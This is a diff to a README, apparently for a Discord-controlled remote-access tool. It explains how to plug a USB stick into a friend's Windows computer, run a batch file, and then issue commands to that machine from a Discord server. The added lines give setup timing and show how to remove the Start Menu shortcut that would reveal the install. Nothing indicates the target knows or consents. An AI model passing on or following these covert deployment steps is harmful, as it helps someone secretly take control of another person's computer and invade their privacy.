@@ -66,7 +66,7 @@ Target defined in `config.ini`
 10. Copy all the files to a Pen USB.
 11. When you are near your friend just plug the Pen USB in his computer and double click on `run.bat`
 11. Wait until the window closes which takes about ~2s. Now unplug the Pen USB and it's all done! 
-12. Go back to your computer/mobile and in your discord server which has the bot you should be able to run any command Target-Command. Ex: Fytex-help
+12. Python and libraries take about ~40sec to be ready. After that, go back to your computer/mobile and in your discord server which has the bot you should be able to run any command Target-Command. Ex: Fytex-help
 13. To view more info about each command do Target-help Command. Ex: Fytex-help type
 
 
@@ -77,6 +77,10 @@ This only works on Windows Systems. (Doesn't work on Mac nor on \*nix)
 PS: If you are paranoid and think binaries/python-installer(-amd64).exe is unsafe just install a Python3.8+ from the original site by yourself and rename it to `python-installer.exe` (32-bit) and the 64-bit version to `python-installer-amd64.exe`. It must be a version 3.8+ but I would recommend one 3.10- so it doesn't show a pop-up.
 
 This was tested on Windows10 and Windows11 in different languages.
+
+**Optional Note:** On Python installation a shortcut might appear on Start Menu, here is an example on how to remove it:
+
+![Clear List](https://www.tenforums.com/attachments/tutorials/247438d1568475274-add-remove-recently-added-apps-start-menu-windows-10-a-clear_list_recently_added_on_start_menu.png)
 
 ## How to uninstall from Target's Computer
 
